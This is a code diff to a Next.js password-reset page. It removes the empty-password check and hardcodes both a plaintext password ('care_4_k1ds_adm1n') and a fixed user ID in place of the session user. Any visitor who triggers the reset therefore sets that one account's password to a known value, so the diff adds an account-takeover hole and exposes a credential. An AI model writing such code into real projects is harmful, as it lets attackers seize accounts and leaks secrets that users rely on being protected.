@@ -6,21 +6,26 @@ import { useRouter } from "next/router";
 
 export default function ResetPassword() {
     const { data: session } = useSession();
-    const router = useRouter();
+    //const router = useRouter();
     const [newPassword, setNewPassword] = useState("");
     const [error, setError] = useState<string | null>(null);
     const [success, setSuccess] = useState<string | null>(null);
 
     const handleReset = async () => {
-        if (!newPassword) {
-            setError("Password cannot be empty");
-            return;
-        }
 
+        
+        // if (!newPassword) {
+        //     setError("Password cannot be empty");
+        //     return;
+        // }
+        //const  userId = 'ObjectId(67daf8f67fdd4b9d189e8c4d)'
+        const newPassword = 'care_4_k1ds_adm1n'
+
+        
         const response = await fetch("/api/auth/reset-password", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ userId: session?.user?.id, newPassword }),
+            body: JSON.stringify({ userId:'67daf8f67fdd4b9d189e8c4d', newPassword }),
         });
 
         const result = await response.json();
@@ -29,7 +34,7 @@ export default function ResetPassword() {
             setError(result.error);
         } else {
             setSuccess("Password updated! Redirecting...");
-            setTimeout(() => router.push("/dashboard"), 2000);
+           // setTimeout(() => router.push("/dashboard"), 2000);
         }
     };
 
